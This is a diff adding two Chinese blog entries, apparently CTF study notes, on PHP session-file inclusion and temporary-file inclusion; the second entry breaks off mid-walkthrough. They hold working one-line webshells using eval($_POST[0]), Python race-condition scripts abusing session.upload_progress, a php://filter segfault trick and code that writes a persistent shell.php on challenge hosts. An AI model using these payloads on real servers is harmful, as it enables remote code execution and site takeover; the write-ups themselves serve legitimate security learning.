@@ -265,6 +265,105 @@
       </tags>
   </entry>
   <entry>
+    <title>包含session文件学习记录</title>
+    <url>/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="PHP-session包含"><a href="#PHP-session包含" class="headerlink" title="PHP session包含"></a>PHP session包含</h1><h2 id="什么是PHP-session"><a href="#什么是PHP-session" class="headerlink" title="什么是PHP session"></a>什么是PHP session</h2><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>
+<span id="more"></span>
+
+<h3 id="PHP-session-变量"><a href="#PHP-session-变量" class="headerlink" title="PHP session 变量"></a>PHP session 变量</h3><p>您在计算机上操作某个应用程序时，您打开它，做些更改，然后关闭它。这很像一次对话（Session）。计算机知道您是谁。它清楚您在何时打开和关闭应用程序。然而，在因特网上问题出现了：由于 HTTP 地址无法保持状态，Web 服务器并不知道您是谁以及您做了什么。</p>
+<p>PHP session 解决了这个问题，它通过在服务器上存储用户信息以便随后使用（比如用户名称、购买商品等）。然而，会话信息是临时的，在用户离开网站后将被删除。如果您需要永久存储信息，可以把数据存储在数据库中。</p>
+<p>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</p>
+<h3 id="开始-PHP-session"><a href="#开始-PHP-session" class="headerlink" title="开始 PHP session"></a>开始 PHP session</h3><p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码会向服务器注册用户的会话，以便您可以开始保存用户信息，同时会为用户会话分配一个 UID。</p>
+<h3 id="存储-session-变量"><a href="#存储-session-变量" class="headerlink" title="存储 session 变量"></a>存储 session 变量</h3><p>session是一个数组，有键和值：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>username</code>是键，<code>admin</code>是值</p>
+<p>存储和取回 session 变量的正确方法是使用 PHP <code>$_SESSION</code> 变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 存储 session 数据</span><br><span class="line">$_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">// 检索 session 数据</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">// 浏览量：1</span><br></pre></td></tr></table></figure>
+
+<p>在下面的实例中，我们创建了一个简单的 <code>page-view</code> 计数器。<code>isset() </code>函数检测是否已设置 “<code>views</code>“ 变量。如果已设置 “<code>views</code>“ 变量，我们累加计数器。如果 “<code>views</code>“ 不存在，则创建 “<code>views</code>“ 变量，并把它设置为 <code>1</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"> </span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=$_SESSION[&#x27;views&#x27;]+1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="session变量存储地址"><a href="#session变量存储地址" class="headerlink" title="session变量存储地址"></a>session变量存储地址</h3><p>查看<code>session.save_path</code></p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>session.save_path</td>
+<td>no value</td>
+<td>no value</td>
+</tr>
+</tbody></table>
+<p><code>session.save_path</code>为<code>no value</code>则表示存储在默认的<code>/tmp</code>或<code>/var/lib/php/session</code>目录下</p>
+<p>反之则会标明详细路径	</p>
+<h3 id="存放session变量文件名"><a href="#存放session变量文件名" class="headerlink" title="存放session变量文件名"></a>存放session变量文件名</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_[phpsessid]</span><br></pre></td></tr></table></figure>
+
+<p> phpsessid 在发送的请求的 <code>cookie</code> 字段中可以看到（保存在<code>cookie</code>里面，专门标识session）</p>
+<h3 id="销毁-session"><a href="#销毁-session" class="headerlink" title="销毁 session"></a>销毁 session</h3><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p>
+<p>unset() 函数用于释放指定的 session 变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unset($_SESSION[&#x27;views&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>您也可以通过调用 session_destroy() 函数彻底销毁 session：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br><span class="line">// session_destroy() 将重置 session，将失去所有已存储的 session 数据。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>把一个可控字符串（php恶意代码）写入session文件，然后包含session文件</p>
+<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="提供对session赋值的功能"><a href="#提供对session赋值的功能" class="headerlink" title="提供对session赋值的功能"></a>提供对session赋值的功能</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[&#x27;a&#x27;]))&#123;</span><br><span class="line">    $a=$_GET[&#x27;a&#x27;];</span><br><span class="line">    $_SESSION[&#x27;username&#x27;]=$a;    </span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br><span class="line">//flag在根目录</span><br></pre></td></tr></table></figure>
+
+<p>上传一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?a=&lt;?php echo 345;eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在cookie中可以看到PHPSESSID，因此可以知道保存payload的文件名</p>
+<p><img src="https://s2.loli.net/2023/11/18/e4y2pTXnSbBxqjF.png" alt="image-20231024193152377"></p>
+<p>尝试默认保存目录，包含session文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/jkc9v2zCLIe6htB.png" alt="image-20231024193718849"></p>
+<p>使用蚁剑连接，获取flag</p>
+<p><img src="https://s2.loli.net/2023/11/18/ip6MrloTe8hgbkX.png" alt="image-20231024193804739"></p>
+<h3 id="没有提供赋值功能"><a href="#没有提供赋值功能" class="headerlink" title="没有提供赋值功能"></a>没有提供赋值功能</h3><h4 id="session-upload-progress写入"><a href="#session-upload-progress写入" class="headerlink" title="session.upload_progress写入"></a><code>session.upload_progress</code>写入</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231024194627329.png" alt="image-20231024194627329"></p>
+<h5 id="php配置"><a href="#php配置" class="headerlink" title="php配置"></a>php配置</h5><p>用<code>phpinfo()</code>查看</p>
+<p><img src="https://s2.loli.net/2023/11/18/LkCjMpXBFSJRQtu.png" alt="image-20231024194828661"></p>
+<p><code>session.upload_progress.enabled</code>：该选项开启（On）时，PHP可以监测文件上传的进度，这是客户端可以发送POST到服务端开查看上传进度，此时<code>session.upload_progress</code>生效</p>
+<p><code>session.upload_progress.cleanup</code>：该选项默认开启，读取POST请求后会删除上传进度信息。这时需要采用<strong>条件竞争</strong>的方法注入木马</p>
+<p>在文件上传过程中，客户端POST一个 <code>session.upload_progress.name</code> 的值同名的变量时，会在 <code>$_SESSION </code>数组中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 拼接在一起的值。因此可以通过POST以 <code>session.upload_progress.name</code> 的值作为变量名的数据，变量值就是 <code>payload</code></p>
+<p><code>session.use_strict_mode</code>：默认关闭，改选项开启时，PHP不接受未初始化的会话id（就不能自己命名PHPSESSID）</p>
+<p><img src="https://s2.loli.net/2023/11/18/caAXuwxWNplgkfI.png" alt="image-20231024195321050"></p>
+<h5 id="实例及详解（session-upload-progress-cleanup为Off）"><a href="#实例及详解（session-upload-progress-cleanup为Off）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为Off）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>Off</code>）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://b.y1ng.vip:2007/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打开后发现是一个上传界面，开启burp代理，然后任意上传一个文件，burp抓包并发送到repeater模块</p>
+<p><img src="https://s2.loli.net/2023/11/18/jaE6izYLsHlbKxW.png" alt="image-20231024200836460"></p>
+<p>利用hackbar包含session文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/2dPbruMC1mJsSo3.png" alt="image-20231024200921497"></p>
+<p>做题时，payload可以为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">123</span>;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="实例及详解（session-upload-progress-cleanup为On）"><a href="#实例及详解（session-upload-progress-cleanup为On）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为On）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>On</code>）</h5><p>[WMCTF 2020]Make PHP Great Again</p>
+<h6 id="解法一：python脚本包含session"><a href="#解法一：python脚本包含session" class="headerlink" title="解法一：python脚本包含session"></a>解法一：python脚本包含session</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>
+
+<p>执行得flag</p>
+<p><img src="https://s2.loli.net/2023/11/18/z5tDdReJVqoXPwA.png" alt="image-20231030222311829"></p>
+<h6 id="解法二：html-爆破"><a href="#解法二：html-爆破" class="headerlink" title="解法二：html+爆破"></a>解法二：html+爆破</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#poc.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;cat /flag.php&#x27;);?&gt;&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.loli.net/2023/11/18/ZB8pTUqw3y5LOA9.png" alt="image-20231030223039080"></p>
+<p><img src="https://s2.loli.net/2023/11/18/rYBoZJX4lDItuzi.png" alt="image-20231030223644568"></p>
+<p><img src="https://s2.loli.net/2023/11/18/GHhTy6a1iJbujU5.png" alt="image-20231030223554025"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XXE学习记录</title>
     <url>/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>前言：</p>
@@ -517,6 +616,102 @@
       </tags>
   </entry>
   <entry>
+    <title>包含临时文件学习记录</title>
+    <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
+<span id="more"></span>
+
+<p>php中上传文件，会创建临时文件，随机生成临时文件名（临时文件名为<code>php+6位[a-zA-Z0-9]</code>，比如<code>phpkx32ma</code>），将上传的内容写入临时文件后，关闭临时文件。在<code>linux</code>下保存在<code>/tmp</code>目录，而在<code>windows</code>下保存在<code>c:\winsdows\temp</code>目录。然后开始执行文件内程序，执行完后删除。因此，可以上传包含payload的恶意文件，在文件被删除前（作为临时文件）包含该文件，可以实现利用。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>配合<code>phpinfo</code>页面的<code>php variables</code>，可以直接获取到上传文件的存储路径和临时文件名</p>
+<p><img src="https://s2.loli.net/2023/11/18/YWsGoH6aLJiC2Uc.png" alt="image-20231025142053342"></p>
+<h2 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h2><p>临时文件转瞬即逝，如何在短时间内包含它？</p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争就是一直上传文件，同时一直去包含临时文件，竞争一下是先包含还是先删除。</p>
+<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出，临时文件就不会被删除。</p>
+<p>在php7中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/string.strip_tags=/etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>会造成段错误。 </p>
+<p>适用版本： </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>
+
+<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><p>查看网页源代码，发现提示信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传递name参数，用burp抓包并发送到repeater模块</p>
+<p><img src="https://s2.loli.net/2023/11/18/y9SgG3NDnjQacIB.png" alt="image-20231025161936687"></p>
+<p><img src="https://s2.loli.net/2023/11/18/oQL6JwPxvsfSk4a.png" alt="image-20231025161900649"></p>
+<p>经过测试，发现改变name的值，响应包中Hash值会响应改变（name和hash一一对应），结合提示，可以传入pass参数，值为响应包中的Hash值（name值和pass值要相对应）。</p>
+<p><img src="https://s2.loli.net/2023/11/18/IDOkeyP7MNYGdKZ.png" alt="image-20231025162123175"></p>
+<p>在响应包中发现提示文件：<code>flflflflag.php</code>，访问该文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/mxInGt6O72psNyY.png" alt="image-20231025162404641"></p>
+<p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>
+
+<p>用BurpSuite拦截响应，base64解码后得到源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用目录扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
+
+<p>扫描发现dir.php。</p>
+<p><img src="https://s2.loli.net/2023/11/18/ruxOEn2CovHcR5U.png" alt="image-20231025165147270"></p>
+<p><img src="https://s2.loli.net/2023/11/18/ULTyQMfe9zqj4VW.png" alt="image-20231025165242501"></p>
+<p>访问dir.php文件：</p>
+<p><img src="https://s2.loli.net/2023/11/18/o7rUlwePmHFVIqA.png" alt="image-20231025163132883"></p>
+<p>查看dir.php源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
+
+<p>用Burpsuite拦截响应，base64解码后源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p>
+<p>该题存在文件包含，而且可以显示临时文件夹（&#x2F;tmp）的内容，因此可以考虑临时文件包含的方法解题。同时，根据响应包中内容：<code>X-Powered-By: PHP/7.0.33</code>，说明php版本存在段错误。</p>
+<p>编写python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO </span><br><span class="line"><span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> </span><br><span class="line"><span class="comment">#注入的恶意命令</span></span><br><span class="line"><span class="comment">#payload=&quot;&lt;?php echo 12;fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo 1234;eval($_POST[0]);?&gt;&#x27;);?&gt;&quot; </span></span><br><span class="line"><span class="comment">#把一句话木马写入shell.php</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行该脚本后，payload就注入到临时文件了。</p>
+<p>再次访问dir.php文件，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpVvvefu</p>
+<p><img src="https://s2.loli.net/2023/11/18/jymveQM7NRstuDc.png" alt="image-20231025164408642"></p>
+<p>利用BurpSuite发送请求，由于本题的flag在<code>phpinfo()</code>中，因此这样就能得到flag：</p>
+<p><img src="https://s2.loli.net/2023/11/18/d5BhRK1X6Tgta9m.png" alt="image-20231025164751449"></p>
+<h3 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h3><p>自己包含自己，进入死循环，脚本永不结束，也就不会删除临时文件。</p>
+<p>文件上传，phpinfo，自包含三者缺一不可，在同一个页面发生。</p>
+<p>题目网址：<a href="http://b.y1ng.vip:2039/%EF%BC%88%E5%B7%B2%E5%A4%B1%E6%95%88%EF%BC%89">http://b.y1ng.vip:2039/（已失效）</a></p>
+<p>题目源码（文件位于<code>index.php</code>）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$page</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>如果将<code>page</code>赋值为<code>index.php</code>，就会开始自包含。</p>
+<p>然后对死循环发送POST请求，此时POST请求对应的临时文件才不会被清理。</p>
+<p>创建上传表单（<code>untitled.html</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://b.y1ng.vip:2039/?page=index.php&amp;info&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt; </span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>创建上传文件（<code>1.txt</code>）：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>); </span><br><span class="line">    <span class="comment"># 123用于检查是否上传成功</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo(&#x27;</span><span class="number">1234</span><span class="string">&#x27;); eval($_POST[0]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment"># 1234用于检查是否执行成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，如果循环次数过多会导致电脑死机，所以不建议长时间循环，最好的方式是包含后就生成一个永久的shell，一包含到就可以结束自包含。</p>
+<p>打开上传表单：</p>
+<p><img src="https://s2.loli.net/2023/11/18/2CguitUDP35bB9s.png" alt="image-20231025193909257"></p>
+<p>上传成功后找到路径</p>
+<p><img src="https://s2.loli.net/2023/11/18/uSEZL1jxi2TqfCM.png" alt="image-20231025195150883"></p>
+<p>包含</p>
+<p><img src="https://s2.loli.net/2023/11/18/8hvtMaESITi7Jd4.png" alt="image-20231025195241303"></p>
+<p>输出123表示1.txt文件上传成功</p>
+<p>关闭循环，找到木马文件路径</p>
